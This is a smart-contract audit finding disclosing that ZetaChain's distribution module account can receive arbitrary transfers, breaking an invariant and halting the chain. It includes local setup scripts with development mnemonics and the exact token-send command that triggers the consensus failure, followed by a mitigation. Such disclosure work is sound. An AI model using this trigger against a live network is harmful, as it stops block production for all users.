# [M] Distribution module address can be used to halt chain breaking all functionality.

## Summary
Severity: Medium
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-12-05
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/176
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/app/app.go#L185-L199


# Vulnerability details

## Impact
Currently any account can send funds to the `distribution` module account breaking the crisis invariant and causing a complete consensus failure resulting in no new blocks being produced.

In Cosmos based blockchains there are whats called `module accounts`. During development extra care has to be taken to ensure that module accounts cannot receive any funds outside of the expected rules of the state machine. If they do this can cause invariants to be broken and result in a halted network. Do to this fact the `x/bank` module accepts a map of addresses that are considered blocklisted from directly receiving funds through arbitrary transactions. 

In the ZetaChain blockchain there are many module accounts that can properly accept funds without breaking the rules of the state machine.  The vulnerability is that the  `distribution`  module account can accept funds from arbitrary users, but does so in a way that breaks the state machine.  

Along with causing a total consensus failure, this bug does not allow for any new blocks to be produced which results in an inability to accept new transactions and brings the chain to a complete halt.  With regard to blockchain bugs, this is among some of the worst possible scenarios that can take place in a distribution state machine. Imagine being able to bring Ethereum to a halt by simply sending 1 wei to a certain address. 

The likelihood of this being exploited in the future is high since it's simply a transfer of tokens from one account to another.

## Proof of Concept
Cosmos Documentation related to this issue located [here](https://docs.cosmos.network/v0.46/modules/bank/02_keepers.html#common-types)

## POC
1. Run `make install`

2. Inside the `cmd/zetacored` folder run the command `go build`.  This will create the blockchains binary `zetacored` which you will use the interact with the blockchain while the node is running. 

3. Run the command `make init`.  I added the genesis account `tommy` to get the chain to start properly and the changes I made to `init.sh` which is run by the `make init` command are as follows:

```

#!/usr/bin/env bash

CHAINID="localnet_101-1"
KEYRING="test"
export DAEMON_HOME=$HOME/.zetacored
export DAEMON_NAME=zetacored

### chain init script for development purposes only ###
rm -rf ~/.zetacored
kill -9 $(lsof -ti:26657)
zetacored config keyring-backend $KEYRING --home ~/.zetacored
zetacored config chain-id $CHAINID --home ~/.zetacored
echo "race draft rival universe maid cheese steel logic crowd fork comic easy truth drift tomorrow eye buddy head time cash swing swift midnight borrow" | zetacored keys add zeta --algo=secp256k1 --recover --keyring-backend=$KEYRING
echo "hand inmate canvas head lunar naive increase recycle dog ecology inhale december wide bubble hockey dice worth gravity ketchup feed balance parent secret orchard" | zetacored keys add mario --algo secp256k1 --recover --keyring-backend=$KEYRING
echo "lounge supply patch festival retire duck foster decline theme horror decline poverty behind clever harsh layer primary syrup depart fantasy session fossil dismiss east" | zetacored keys add executer_zeta --recover --keyring-backend=$KEYRING --algo secp256k1
echo "debris dumb among crew celery derive judge spoon road oyster dad panic adult song attack net pole merge mystery pig actual penalty neither peasant"| zetacored keys add executer_mario --algo=secp256k1 --recover --keyring-backend=$KEYRING

zetacored init Zetanode-Localnet --chain-id=$CHAINID

#Set config to use azeta
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["staking"]["params"]["bond_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["crisis"]["constant_fee"]["denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["gov"]["deposit_params"]["min_deposit"][0]["denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["mint"]["params"]["mint_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["evm"]["params"]["evm_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.consensus_params["block"]["max_gas"]="10000000"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
contents="$(jq '.app_state.gov.voting_params.voting_period = "10s"' $DAEMON_HOME/config/genesis.json)" && \
echo "${contents}" > $DAEMON_HOME/config/genesis.json
sed -i '/\[api\]/,+3 s/enable = false/enable = true/' ~/.zetacored/config/app.toml


zetacored add-observer-list standalone-network/observers.json --keygen-block=5
zetacored keys add tommy --keyring-backend test # added
zetacored add-genesis-account tommy 1000000000000000000000stake,1000000000000000000000azeta # added
zetacored gentx tommy 1000000000000000000000stake --chain-id=$CHAINID --keyring-backend=$KEYRING # added


echo "Collecting genesis txs..."
zetacored collect-gentxs

echo "Validating genesis file..."
zetacored validate-genesis
```

4. Run `make run`. I also made the following changes ( adding the  `--inv-check-period 2`  flag) to the `run.sh` file which is run when calling the `make run` command so that all invariants can be checked every two blocks to catch the vulnerability quickly. 

```
#!/usr/bin/env bash

CHAINID="localnet_101-1"
KEYRING="test"
HOSTNAME=$(hostname)
signer="zeta"


killall zetacored
zetacored start --inv-check-period 2 --trace \
--minimum-gas-prices=0.0001azeta \
--json-rpc.api eth,txpool,personal,net,debug,web3,miner \
--api.enable >> ~/.zetacored/zetacored.log 2>&1  & \
#>> "$HOME"/.zetacored/zetanode.log 2>&1  & \


#--home ~/.zetacored \
#--p2p.laddr 0.0.0.0:27655  \
#--grpc.address 0.0.0.0:9096 \
#--grpc-web.address 0.0.0.0:9093 \
#--address tcp://0.0.0.0:27659 \
#--rpc.laddr tcp://127.0.0.1:26657 \
#--pruning custom \
#--pruning-keep-recent 54000 \
#--pruning-interval 10 \
#--min-retain-blocks 54000 \
#--state-sync.snapshot-interval 14400 \
#--state-sync.snapshot-keep-recent 3

#echo "--> Submitting proposal to update admin policies "
#sleep 7
#zetacored tx gov submit-legacy-proposal param-change standalone-network/proposal.json --from $signer --gas=auto --gas-adjustment=1.5 --gas-prices=0.001azeta --chain-id=$CHAINID --keyring-backend=$KEYRING -y --broadcast-mode=block
#echo "--> Submitting vote for proposal"
#sleep 7
#zetacored tx gov vote 1 yes --from $signer --keyring-backend $KEYRING --chain-id $CHAINID --yes --fees=40azeta --broadcast-mode=block
tail -f ~/.zetacored/zetacored.log
```

5. While the chain is running,  in another terminal you can query the blockchain and send transactions using the `zetacored` binary. First you can see all the module accounts by running the command `zetacored q auth accounts`.  This will contain the vulnerable `distribution` account as shown below. Make sure the address is correct for the next step. You can also verify the `zeta` account being used to send funds to the `distribution` account with the command `zetacored keys list`.

```
'@type': /cosmos.auth.v1beta1.ModuleAccount
base_account:
account_number: "6"
address: zeta1jv65s3grqf6v6jl3dp4t6c9t9rk99cd83m2fn0
pub_key: null
sequence: "0"
name: distribution
permissions: []
```

6. Use the already included `zeta` account that has an `azeta` balance to send a transaction that sends funds from the `zeta` account to the vulnerable `distribution` account with the following command which will cause the chain to halt with a `Consensus Failure` error and also cause all blocks to stop being produced breaking the chain completely. 

`zetacored tx bank send zeta13c7p3xrhd6q2rx3h235jpt8pjdwvacyw6twpax zeta1jv65s3grqf6v6jl3dp4t6c9t9rk99cd83m2fn0 100azeta --gas-prices 20azeta`

## Tools Used
Manual code review 

## Recommended Mitigation Steps
The way to fix this bug is by adding the `distribution` module account address to the blocklisted mapping in the bank module. This will prevent arbitrary users from sending funds directly to this address. If this address is indeed suppose to hold funds it should be done in a way that does not break the state machine or cause invariants to break.

Solution described [here](https://docs.cosmos.network/v0.46/modules/bank/02_keepers.html#common-types)








## Assessed type

Other
